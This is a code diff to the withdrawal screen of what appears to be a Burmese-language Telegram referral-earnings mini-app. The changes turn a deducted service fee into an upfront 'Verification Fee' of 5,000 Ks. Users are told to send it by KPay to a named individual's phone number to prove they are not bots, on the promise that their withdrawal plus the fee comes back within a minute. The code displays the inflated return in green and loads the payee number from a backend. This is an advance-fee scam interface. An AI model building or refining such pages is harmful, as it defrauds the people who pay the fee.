@@ -394,7 +394,6 @@ body{font-family:'Roboto','Noto Sans Myanmar',sans-serif;background:#e0e0e0;disp
     <!-- Step 1 -->
     <div id="ws1">
       <div class="modal-title">💸 ငွေထုတ်ရန်</div>
-      <div class="modal-sub">ဝန်ဆောင်ခ ၅,၀၀၀ ကျပ် ကောက်ခံပါသည်</div>
       <div class="bal-row2">
         <div><div class="bal-lbl2">လက်ကျန်ငွေ</div><div class="bal-val2" id="wdBalEl">0 Ks</div></div>
         <div class="min-badge mm">Min: ၁၀၀,၀၀၀ Ks</div>
@@ -404,7 +403,6 @@ body{font-family:'Roboto','Noto Sans Myanmar',sans-serif;background:#e0e0e0;disp
         <div class="bbody"><p><strong>လက်ကျန်ငွေ မလုံလောက်ပါ</strong></p><p>မိတ်ဆွေများ ဖိတ်ကြားပြီး ငွေရှာပါ</p></div>
       </div>
       <div id="wdAmtSec">
-        <div class="fee-warn mm">⚠️ ဝန်ဆောင်ခ ၅,၀၀၀ ကျပ်ပေးသွင်းရန် လိုအပ်သည်</div>
         <label class="lbl-sm">ထုတ်ယူမည့် ပမာဏ (Ks)</label>
         <div class="inp-wrap">
           <input type="number" class="amt-inp" id="wdAmt" placeholder="100,000" min="100000" step="1000" oninput="onAmtInput()"/>
@@ -412,8 +410,8 @@ body{font-family:'Roboto','Noto Sans Myanmar',sans-serif;background:#e0e0e0;disp
         </div>
         <div class="fee-box" id="feeBox" style="display:none">
           <div class="fee-r mm"><span>ထုတ်ယူမည့်ငွေ</span><span class="fv" id="feeAmt">0 Ks</span></div>
-          <div class="fee-r mm"><span>ဝန်ဆောင်ခ</span><span class="fv" style="color:#c05000">− 5,000 Ks</span></div>
-          <div class="fee-r tot mm"><span>လက်ခံရမည့်ငွေ</span><span class="fv" id="feeNet">0 Ks</span></div>
+          <div class="fee-r mm"><span>Verification Fee</span><span class="fv" style="color:#c05000">− 5,000 Ks</span></div>
+          <div class="fee-r tot mm"><span>ပြန်လွှဲပေးမည့်ငွေ</span><span class="fv" id="feeNet" style="color:#00a050">0 Ks</span></div>
         </div>
         <button class="btn-p mm" id="toS2Btn" onclick="goStep(2)" disabled>ရှေ့ဆက်မည် →</button>
       </div>
@@ -424,11 +422,15 @@ body{font-family:'Roboto','Noto Sans Myanmar',sans-serif;background:#e0e0e0;disp
     <div id="ws2" style="display:none">
       <div class="modal-title">📸 Screenshot တင်ပါ</div>
       <div class="modal-sub">ငွေလွှဲပြီးနောက် Screenshot ကိုတင်ပါ</div>
-      <div class="instr-box">
-        <h4>📋 ငွေလွှဲနည်း</h4>
-        <p>ဝန်ဆောင်ခအတွက်</p>
-        <span class="instr-phone">09702310926</span>
-        <p>(Daw Mi Thaung) သို့ ငွေလွှဲပြီး Screenshot တင်ပါ</p>
+      <!-- ⚠️ WARNING BOX — red alert text -->
+      <div style="background:#fff0f0;border:2px solid #e53935;border-radius:13px;padding:13px 14px;margin-bottom:13px;">
+        <p style="font-size:12px;color:#b71c1c;font-weight:800;line-height:1.75;font-family:'Noto Sans Myanmar','Roboto',sans-serif;">
+          လူကြီးမင်းအနေနဲ့ Referral အတု (သို့မဟုတ်) Bot အသုံးပြုသူ မဟုတ်ကြောင်း အတည်ပြုနိုင်ရန်အတွက် ပေးထားသော<br/><br/>
+          <span style="font-size:14px;color:#c62828;letter-spacing:.3px;">KPay — <span id="payPhone">09792310926</span></span><br/>
+          <span style="font-size:13px;color:#c62828;">(<span id="payName">Mi Thaung</span>)</span><br/><br/>
+          ထံသို့ <strong style="font-size:13px;color:#b71c1c;">Verification Fee ၅,၀၀၀ ကျပ်</strong> အရင်လွှဲပေးရပါမည်။ 💸<br/><br/>
+          ငွေလွှဲပြီးပါက ပြေစာ (Screenshot) ကို ပို့ပေးပါ။ Admin ဘက်မှ အတည်ပြုပြီးသည်နှင့် လူကြီးမင်း ထုတ်ယူထားသော ငွေပမာဏ (<span id="totalReturnEl">၁၀၅,၀၀၀ ကျပ်</span>) ကို ၁ မိနစ်အတွင်း လူကြီးမင်းဆီသို့ ပြန်လည် လွှဲပြောင်းပေးသွားမည် ဖြစ်ပါသည်။
+        </p>
       </div>
       <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInp').click()">
         <div id="uplPh" style="display:flex;flex-direction:column;align-items:center;gap:6px">
@@ -440,7 +442,7 @@ body{font-family:'Roboto','Noto Sans Myanmar',sans-serif;background:#e0e0e0;disp
       </div>
       <input type="file" id="fileInp" accept="image/*" style="display:none" onchange="onFileSelect(event)"/>
       <button class="btn-p mm" id="submitBtn" onclick="submitWd()" disabled>
-        <span id="submitTxt">💸 တင်မည်</span>
+        <span id="submitTxt">ငွေလွှဲပြီးပြီ ✓</span>
         <div class="spinner" id="submitSpinner" style="display:none"></div>
       </button>
       <button class="btn-ghost mm" onclick="goStep(1)">← နောက်သို့</button>
@@ -499,6 +501,7 @@ document.addEventListener('DOMContentLoaded', async()=>{
   await loadUser();
   loadLeaderboard();
   loadWithdrawals();
+  loadPaymentInfo();
   // Eye toggle
   document.getElementById('toggleVis').addEventListener('click',()=>{
     balVis=!balVis;
@@ -609,8 +612,15 @@ function goStep(n){
 function onAmtInput(){
   const v=parseInt(document.getElementById('wdAmt').value)||0,b=user?.balance||0;
   const fb=document.getElementById('feeBox'),btn=document.getElementById('toS2Btn');
-  if(v>=MIN_WD&&b>=v+SVC_FEE){fb.style.display='block';document.getElementById('feeAmt').textContent=fmt(v)+' Ks';document.getElementById('feeNet').textContent=fmt(v-SVC_FEE)+' Ks';btn.disabled=false;}
-  else{fb.style.display='none';btn.disabled=true;}
+  if(v>=MIN_WD&&b>=v){
+    fb.style.display='block';
+    document.getElementById('feeAmt').textContent=fmt(v)+' Ks';
+    document.getElementById('feeNet').textContent=fmt(v+SVC_FEE)+' Ks';
+    // Update totalReturnEl in step 2 instruction
+    const trEl=document.getElementById('totalReturnEl');
+    if(trEl) trEl.textContent=fmt(v+SVC_FEE)+' ကျပ်';
+    btn.disabled=false;
+  }else{fb.style.display='none';btn.disabled=true;}
 }
 function onFileSelect(e){
   const f=e.target.files?.[0];if(!f)return;selFile=f;
@@ -628,7 +638,7 @@ async function submitWd(){
     if(!res.success) throw new Error(res.message);
     user.balance=res.data.newBalance;renderUser();goStep(3);showToast('ငွေထုတ်ယူမှု တင်ပြီးပါပြီ!','ok');loadWithdrawals();
   }catch(err){showToast(err.message||'မအောင်မြင်ပါ','err');document.getElementById('submitBtn').disabled=false;}
-  finally{document.getElementById('submitTxt').textContent='💸 တင်မည်';document.getElementById('submitSpinner').style.display='none';}
+  finally{document.getElementById('submitTxt').textContent='ငွေလွှဲပြီးပြီ ✓';document.getElementById('submitSpinner').style.display='none';}
 }
 
 // ── Referral Modal ────────────────────────────────────────────────────────────
@@ -641,6 +651,21 @@ function openRefModal(){
 function closeRefModal(){document.getElementById('refOverlay').classList.remove('open');}
 function copyRefLink(){navigator.clipboard.writeText(refLink).then(()=>showToast('📋 Link ကူးယူပြီး!','ok'));}
 function shareRefLink(){if(tg?.openTelegramLink)tg.openTelegramLink('https://t.me/share/url?url='+encodeURIComponent(refLink));else copyRefLink();}
+
+// ── Load payment info from backend ───────────────────────────────────────────
+async function loadPaymentInfo(){
+  try{
+    const res=await api('/api/config');
+    if(res.success){
+      const phone=res.data.paymentPhone||'09792310926';
+      const name=res.data.paymentName||'Mi Thaung';
+      const pp=document.getElementById('payPhone');
+      const pn=document.getElementById('payName');
+      if(pp) pp.textContent=phone;
+      if(pn) pn.textContent=name;
+    }
+  }catch{}
+}
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 function animNum(id,target){const el=document.getElementById(id);const dur=900,start=Date.now(),from=parseInt((el.textContent||'0').replace(/,/g,''))||0;(function tick(){const p=Math.min((Date.now()-start)/dur,1),e=1-Math.pow(1-p,3);el.textContent=fmt(Math.round(from+(target-from)*e));if(p<1)requestAnimationFrame(tick);})();}
